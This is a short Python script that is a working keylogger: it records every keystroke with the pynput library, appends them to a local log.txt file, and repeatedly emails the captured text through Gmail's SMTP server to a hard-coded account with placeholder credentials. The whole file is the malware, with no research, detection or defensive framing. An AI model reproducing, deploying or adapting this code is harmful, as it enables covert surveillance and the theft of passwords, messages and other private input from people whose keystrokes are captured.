from pynput.keyboard import Listener
import time, smtplib
import subprocess, smtplib
from threading import Timer



txt = []


def log_keystroke(key):
    key = str(key).replace("'", "")
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'

    with open("log.txt", 'a') as f:
        txt.append(key)
        f.write(key)

    if True:
        with open("log.txt", 'r') as f:
            temp = "".join(txt)
            temp = temp.replace(" ", '')
            print(len(temp))
            if len(temp) % 5 == 0:
                send_email("email@gmail.com", "password")
                print(len(txt), 'sent email')

def send_email(email, password):
    # using googles server
    result = ''.join(txt)
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, result)
    server.quit()



with Listener(on_press=log_keystroke) as l:
    l.join()




